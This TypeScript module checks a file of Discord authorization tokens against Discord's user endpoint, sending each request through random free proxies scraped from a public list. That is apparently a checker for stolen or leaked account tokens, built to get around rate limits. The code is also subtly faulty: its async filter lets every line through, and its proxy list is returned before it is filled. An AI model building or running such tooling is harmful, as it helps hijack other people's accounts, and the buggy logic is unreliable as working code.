import fs from 'fs';
import readline from 'readline';
import axios from 'axios';

export const lineFilter = (file: string, filter: (line: string, index?: number) => boolean | Promise<boolean>): Promise<string[]> => {
	return new Promise((resolve) => {
		const lines: string[] = [];

		let lineIndex = 0;
		readline
			.createInterface(fs.createReadStream(file))
			.on('line', async (line: string) => filter(line, lineIndex++) && lines.push(line))
			.on('close', () => resolve(lines));
	});
};
export const lineCallback = (file: string, callback: (line: string) => void) => {
	readline.createInterface(fs.createReadStream(file)).on('line', (line: string) => callback(line));
};

export const proxyChecker = async (file: string, urlToCheck: string, callback: (host: string, port: string, ok: boolean) => any) => {
	lineCallback(file, async (line) => {
		// regex to match ip:port
		const regex = /(?<host>(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?))\:(?<port>\d{2,5})/;

		const { groups } = regex.exec(line) ?? {};
		if (!groups) return;

		const { host, port } = groups;

		axios({
			url: urlToCheck,
			proxy: {
				host,
				port: port as unknown as number,
			},
		})
			.then(({ status, data }) => callback(host, port, status === 200 && data))
			.catch(() => callback(host, port, false));
	});
};
export const tokenChecker = async (file: string) => {
	const proxies = await getProxies();

	return lineFilter(file, async (line) => {
		let ok = false;

		const proxy = proxies[Math.floor(Math.random() * proxies.length)];

		await axios({
			url: 'https://discordapp.com/api/v9/users/@me',
			headers: {
				Authorization: line,
			},
			proxy: {
				host: proxy.host,
				port: proxy.port,
			},
		})
			.then(({ status, data }) => (ok = status === 200 && data.id))
			.catch(() => (ok = false));

		return ok;
	});
};

export const getProxies = async () => {
	const proxies: { host: string; port: number; ip: string }[] = [];

	await axios({
		url: 'https://api.proxyscrape.com/v2/',
		params: {
			request: 'getproxies',
			protocol: 'http',
			timeout: 2500,
			country: 'all',
			ssl: 'all',
			anonymity: 'all',
			simplified: 'true',
		},
	})
		.then(async ({ data }) => {
			const fetchedProxies = data.split('\n');
			if (!fetchedProxies) throw new Error('No proxies found from proxyscrape api');

			// save proxies to file
			fs.writeFile('proxies.txt', fetchedProxies.join('\n'), (err) => {
				if (err) throw err;

				console.log('Proxies saved to file!');
			});

			// #region check proxies
			let tested = 0;
			console.log(`Checking ${fetchedProxies.length} proxies from proxyscrape api!`);
			proxyChecker('proxies.txt', 'http://www.example.com', (host, port, ok) => {
				console.log(`[${++tested}/${proxies.length}] ${host}:${port} | ${ok ? 'OK' : 'FAILED'}`);

				ok && proxies.push({ host, port: port as unknown as number, ip: `${host}:${port}` });
			});
			// #endregion
		})
		.catch(async () => {
			console.log(`Checking proxies from proxies.txt!`);
			await proxyChecker('proxies.txt', 'http://www.example.com', (host, port, ok) => ok && proxies.push({ host, port: port as unknown as number, ip: `${host}:${port}` }));
		});

	return proxies;
};

export const getTokens = () => tokenChecker('tokens.txt');
